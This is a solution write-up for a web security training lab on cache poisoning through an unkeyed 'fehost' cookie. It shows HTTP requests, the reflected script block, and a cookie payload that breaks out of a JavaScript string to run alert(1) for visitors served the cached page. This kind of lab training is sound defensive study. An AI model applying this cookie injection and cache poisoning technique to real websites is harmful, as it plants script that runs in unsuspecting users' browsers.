## Web cache poisoning with an unkeyed cookie

This lab is vulnerable to web cache poisoning because cookies aren't included in the cache key. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes alert(1) in the visitor's browser.

## Notes

- Exploit server
- /login
- X-Cache Header
- Cache-Control Header
- `fehost` cookie

## Resume

1. Find cached request
2. Exploit the XSS with custom cookie
3. Store payload on exploit server
4. Deliver exploit to victim

## Solve

The first step is to find a cached request, in this lab the home page has a cached HTTPS response : 

```http
GET / HTTP/2
Host: 0a93000c04f424dd80353f5000e00083.web-security-academy.net
```

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 9
X-Cache: hit
Content-Length: 10904
```

On the response we can also see some custom data : 

```js
<script>
    data = {"host":"0a93000c04f424dd80353f5000e00083.web-security-academy.net","path":"/","frontend":"prod-cache-01"}
</script>
```

And if we access to the login page we can see custom cookies in the request : 

```
Cookie: session=3Up5jIcyl2yTpFJcsA7HcPuvdVJPcRdU; fehost=prod-cache-01
```

If we update the **fehost** cookie we can see that it is reflected in the answer, for exemple if we update it with **foo** we will see : 

```js
<script>
    data = {"host":"0a93000c04f424dd80353f5000e00083.web-security-academy.net","path":"/","frontend":"foo"}
</script>
```

If we update the cookie with the following payload, and send the request : 

```js
Cookie: session=3Up5jIcyl2yTpFJcsA7HcPuvdVJPcRdU; fehost="-alert(1)}//;
```

The visitor will triger the XSS once he load the cached request and the lab will be solve. 



